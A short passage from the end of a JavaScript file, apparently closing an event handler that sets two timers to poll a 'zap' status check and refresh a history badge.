    setInterval(checkZapStatus, 30000);
    setInterval(() => updateHistoryBadge(), 60000);
});
